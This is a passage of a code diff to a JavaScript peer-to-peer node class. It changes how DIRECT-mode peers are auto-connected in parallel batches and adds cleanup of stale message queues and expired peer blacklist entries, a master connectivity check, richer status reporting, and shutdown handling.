+    // FIX: Filter for DIRECT mode only, try to connect regardless of reachable flag
+    const directPeers = Array.from(this.knownPeers.values())
       .filter(peer => 
-        peer.reachable && 
-        peer.mode === 'DIRECT' && 
+        peer.mode === 'DIRECT' &&  // Only DIRECT mode
         !this.peers.has(peer.nodeId) &&
-        !this.connectionLocks.has(peer.nodeId) && // FIX: Don't try if locked
-        !(peer.ip === this.nodeIp && peer.port === this.nodePort) // FIX: Skip self
+        !this.connectionLocks.has(peer.nodeId) &&
+        !this.isBlacklisted(peer.nodeId) &&
+        !(peer.ip === this.nodeIp && peer.port === this.nodePort)
       )
       .slice(0, this.p2pConfig.maxPeers - this.peers.size);
     
-    if (reachablePeers.length === 0) {
+    if (directPeers.length === 0) {
+      console.log('[P2P-AUTO] No DIRECT mode peers to connect');
       return;
     }
     
-    console.log(`[P2P] Auto-connecting to ${reachablePeers.length} reachable peers...`);
+    console.log(`[P2P-AUTO] Auto-connecting to ${directPeers.length} DIRECT peers...`);
+    this.stats.lastAutoConnect = Date.now();
     
-    for (const peer of reachablePeers) {
+    const maxParallel = 3;
+    for (let i = 0; i < directPeers.length; i += maxParallel) {
       if (this.isShuttingDown) break;
       
-      // FIX: Check limits again in loop
-      if (this.peers.size >= this.p2pConfig.maxPeers) {
-        console.log('[P2P] Max peers reached during auto-connect');
-        break;
-      }
+      const batch = directPeers.slice(i, i + maxParallel);
       
-      try {
-        const result = await this.connectToPeer(peer.nodeId, peer);
-        if (result.success) {
-          console.log(`[P2P] Auto-connected to ${peer.nodeId}`);
-        } else {
-          console.log(`[P2P] Auto-connect failed for ${peer.nodeId}: ${result.error}`);
-        }
-        // Rate limit
+      await Promise.all(
+        batch.map(async peer => {
+          if (this.peers.size >= this.p2pConfig.maxPeers) {
+            return;
+          }
+          
+          try {
+            const result = await this.connectToPeer(peer.nodeId, peer);
+            if (result.success) {
+              console.log(`[P2P-AUTO] Connected to ${peer.nodeId}`);
+            } else {
+              console.log(`[P2P-AUTO] Failed to connect to ${peer.nodeId}: ${result.error}`);
+            }
+          } catch (error) {
+            console.error(`[P2P-AUTO] Error connecting to ${peer.nodeId}:`, error.message);
+          }
+        })
+      );
+      
+      if (i + maxParallel < directPeers.length) {
         await new Promise(resolve => setTimeout(resolve, 2000));
-      } catch (error) {
-        console.error(`[P2P] Auto-connect error for ${peer.nodeId}:`, error.message);
       }
     }
   }
   
-  /**
-   * Start peer cleanup (remove stale peers)
-   */
   startPeerCleanup() {
     if (this.peerCleanupInterval) {
       clearInterval(this.peerCleanupInterval);
@@ -889,7 +1155,6 @@ class P2PHybridNode extends EventEmitter {
       const now = Date.now();
       const timeout = this.p2pConfig.peerTimeout;
       
-      // Cleanup stale known peers
       let removedKnown = 0;
       for (const [nodeId, peer] of this.knownPeers) {
         if (now - peer.lastUpdate > timeout * 2) {
@@ -901,16 +1166,13 @@ class P2PHybridNode extends EventEmitter {
         console.log(`[P2P-CLEANUP] Removed ${removedKnown} stale peer info(s)`);
       }
       
-      // Cleanup stale connections
       let removedConnections = 0;
       for (const [nodeId, peer] of this.peers) {
         if (now - peer.lastSeen > timeout) {
-          console.log(`[P2P-CLEANUP] Peer ${nodeId} timed out (last seen ${Math.round((now - peer.lastSeen)/1000)}s ago)`);
+          console.log(`[P2P-CLEANUP] Peer ${nodeId} timed out`);
           try {
             peer.ws.close();
-          } catch (e) {
-            // ignore
-          }
+          } catch (e) {}
           this.peers.delete(nodeId);
           this.connectionLocks.delete(nodeId);
           removedConnections++;
@@ -920,7 +1182,6 @@ class P2PHybridNode extends EventEmitter {
         console.log(`[P2P-CLEANUP] Removed ${removedConnections} stale connection(s)`);
       }
       
-      // FIX: Cleanup orphaned locks
       let removedLocks = 0;
       for (const nodeId of this.connectionLocks) {
         if (!this.peers.has(nodeId)) {
@@ -932,14 +1193,36 @@ class P2PHybridNode extends EventEmitter {
         console.log(`[P2P-CLEANUP] Removed ${removedLocks} orphaned lock(s)`);
       }
       
-    }, 60000); // Every minute
+      let removedQueues = 0;
+      for (const [nodeId, queue] of this.messageQueue) {
+        const filtered = queue.filter(item => now - item.timestamp < 300000);
+        if (filtered.length === 0) {
+          this.messageQueue.delete(nodeId);
+          removedQueues++;
+        } else if (filtered.length < queue.length) {
+          this.messageQueue.set(nodeId, filtered);
+        }
+      }
+      if (removedQueues > 0) {
+        console.log(`[P2P-CLEANUP] Removed ${removedQueues} empty message queue(s)`);
+      }
+      
+      let removedBlacklist = 0;
+      for (const [nodeId, entry] of this.peerBlacklist) {
+        if (now > entry.until) {
+          this.peerBlacklist.delete(nodeId);
+          removedBlacklist++;
+        }
+      }
+      if (removedBlacklist > 0) {
+        console.log(`[P2P-CLEANUP] Removed ${removedBlacklist} expired blacklist entry(ies)`);
+      }
+      
+    }, this.p2pConfig.cleanupInterval);
     
     console.log('[P2P-CLEANUP] Peer cleanup started');
   }
   
-  /**
-   * FIX: Optimized heartbeat - use only WebSocket ping
-   */
   startPeerHeartbeat() {
     if (this.heartbeatInterval) {
       clearInterval(this.heartbeatInterval);
@@ -951,8 +1234,6 @@ class P2PHybridNode extends EventEmitter {
       for (const [nodeId, peer] of this.peers) {
         try {
           if (peer.ws.readyState === WebSocket.OPEN) {
-            // FIX: Use only WebSocket-level ping, not application-level
-            // This is more efficient and handled by the WebSocket library
             peer.ws.ping();
           }
         } catch (error) {
@@ -960,27 +1241,48 @@ class P2PHybridNode extends EventEmitter {
         }
       }
       
+      const now = Date.now();
+      if (!this.lastMasterCheck || (now - this.lastMasterCheck > 60000)) {
+        this.checkMasterConnectivity();
+      }
+      
     }, this.p2pConfig.heartbeatInterval);
     
     console.log(`[P2P-HEARTBEAT] Peer heartbeat started (${this.p2pConfig.heartbeatInterval}ms)`);
   }
   
-  /**
-   * Get P2P status
-   */
   getStatus() {
     return {
       enabled: this.p2pConfig.enabled,
       nodeId: this.nodeId,
       nodeIp: this.nodeIp,
       nodePort: this.nodePort,
+      serverReady: this.isServerReady,
+      masterReachable: this.masterReachable,
       peers: {
         connected: this.peers.size,
         known: this.knownPeers.size,
         max: this.p2pConfig.maxPeers,
-        locks: this.connectionLocks.size
+        locks: this.connectionLocks.size,
+        blacklisted: this.peerBlacklist.size
       },
-      stats: { ...this.stats },
+      messageQueue: {
+        peers: this.messageQueue.size,
+        totalMessages: Array.from(this.messageQueue.values())
+          .reduce((sum, queue) => sum + queue.length, 0)
+      },
+      stats: { 
+        ...this.stats,
+        successRate: this.stats.connectionAttempts > 0 
+          ? ((this.stats.connectionSuccesses / this.stats.connectionAttempts) * 100).toFixed(2) + '%'
+          : 'N/A'
+      },
+      config: {
+        autoConnect: this.p2pConfig.autoConnect,
+        relayFallback: this.p2pConfig.relayFallback,
+        maxPeers: this.p2pConfig.maxPeers,
+        discoveryInterval: this.p2pConfig.discoveryInterval
+      },
       connectedPeers: Array.from(this.peers.entries()).map(([nodeId, peer]) => ({
         nodeId,
         ip: peer.ip,
@@ -991,7 +1293,8 @@ class P2PHybridNode extends EventEmitter {
         messagesReceived: peer.messagesReceived,
         messagesSent: peer.messagesSent,
         connectedAt: peer.connectedAt,
-        uptime: Date.now() - peer.connectedAt
+        uptime: Date.now() - peer.connectedAt,
+        capabilities: peer.capabilities
       })),
       knownPeers: Array.from(this.knownPeers.values()).map(peer => ({
         nodeId: peer.nodeId,
@@ -1000,19 +1303,26 @@ class P2PHybridNode extends EventEmitter {
         mode: peer.mode,
         reachable: peer.reachable,
         connected: this.peers.has(peer.nodeId),
-        locked: this.connectionLocks.has(peer.nodeId)
+        locked: this.connectionLocks.has(peer.nodeId),
+        blacklisted: this.isBlacklisted(peer.nodeId)
       }))
     };
   }
   
-  /**
-   * FIX: Better shutdown with proper cleanup
-   */
+  cleanup() {
+    if (this.wss) {
+      try {
+        this.wss.close();
+      } catch (e) {}
+      this.wss = null;
+    }
+    this.isServerReady = false;
+  }
+  
   shutdown() {
     console.log('[P2P] Shutting down P2P node...');
     this.isShuttingDown = true;
     
-    // Clear intervals
     if (this.discoveryInterval) {
       clearInterval(this.discoveryInterval);
       this.discoveryInterval = null;
@@ -1025,15 +1335,17 @@ class P2PHybridNode extends EventEmitter {
       clearInterval(this.heartbeatInterval);
       this.heartbeatInterval = null;
     }
+    if (this.autoConnectInterval) {
+      clearInterval(this.autoConnectInterval);
+      this.autoConnectInterval = null;
+    }
     
-    // FIX: Cleanup all request handlers
     for (const [key, handler] of this.requestHandlers) {
-      const eventType = key.split('_')[0] + '_response';
+      const eventType = key.split('_').slice(0, -1).join('_') + '_response';
       this.removeListener(eventType, handler);
     }
     this.requestHandlers.clear();
     
-    // Close all peer connections
     for (const [nodeId, peer] of this.peers) {
       try {
         this.sendToPeer(nodeId, {
@@ -1042,35 +1354,24 @@ class P2PHybridNode extends EventEmitter {
           timestamp: Date.now()
         });
         
-        // Give peers time to receive goodbye
         setTimeout(() => {
           try {
             peer.ws.close();
-          } catch (e) {
-            // ignore
-          }
+          } catch (e) {}
         }, 500);
         
-      } catch (e) {
-        // ignore
-      }
+      } catch (e) {}
     }
     
-    // Clear maps
     setTimeout(() => {
       this.peers.clear();
       this.knownPeers.clear();
       this.connectionLocks.clear();
+      this.messageQueue.clear();
+      this.peerBlacklist.clear();
     }, 1000);
     
-    // Close server
-    if (this.wss) {
-      this.wss.close(() => {
-        console.log('[P2P] WebSocket server closed');
-      });
-    }
-    
-    // Remove all event listeners
+    this.cleanup();
     this.removeAllListeners();
     
     console.log('[P2P] P2P node shutdown complete');
